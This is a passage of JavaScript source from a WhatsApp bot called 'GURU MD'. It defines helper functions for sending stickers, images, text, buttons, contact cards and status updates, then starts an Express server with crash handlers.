      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} buttons
     * @param {*} caption
     * @param {*} footer
     * @param {*} quoted
     * @param {*} options
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:GURU MD\nitem1.TEL;waid=\( {i}: \){i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:gurutech@example.com\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/itsguruu/GURU\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Nairobi;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => {
  res.send(" 𝑮𝑼𝑹𝑼 𝑴𝑫 𝑰𝑺 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ✅");
  });
  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
  setTimeout(() => {
  connectToWA()
  }, 4000);
// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});
